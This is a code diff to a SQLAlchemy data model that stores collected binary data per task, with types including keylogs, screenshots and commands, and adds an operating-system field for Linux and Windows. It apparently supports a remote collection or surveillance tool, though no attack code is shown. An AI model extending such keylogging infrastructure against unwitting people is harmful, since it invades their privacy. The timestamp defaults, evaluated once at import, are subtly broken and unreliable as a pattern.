@@ -8,12 +8,17 @@ from sqlalchemy.ext.declarative import declarative_base
 Base = declarative_base()
 
 
-class DataType(enum.Enum):
-    SCREENSHOT = 'SCREENSHOT'
-    KEYLOG = 'KEYLOG'
-    COMMAND = 'COMMAND'
-    TELEMETRY = 'TELEMETRY'
-    FILE = 'FILE'
+class DataType(str, enum.Enum):
+    SCREENSHOT = 'screenshot'
+    KEYLOG = 'keylog'
+    COMMAND = 'command'
+    TELEMETRY = 'telemetry'
+    FILE = 'file'
+
+
+class OSType(str, enum.Enum):
+    LINUX = 'linux'
+    WINDOWS = 'windows'
 
 
 class DataModel(Base):
@@ -24,6 +29,7 @@ class DataModel(Base):
     task_id = Column(UUID, nullable=False)
     data = Column(LargeBinary, nullable=False)
     data_type = Column(Enum(DataType), nullable=False)
+    os_type = Column(Enum(OSType), nullable=False)
     collected_at = Column(TIMESTAMP, nullable=False, default=datetime.datetime.now(datetime.UTC))
     stored_at = Column(TIMESTAMP, nullable=False, default=datetime.datetime.now(datetime.UTC))
 
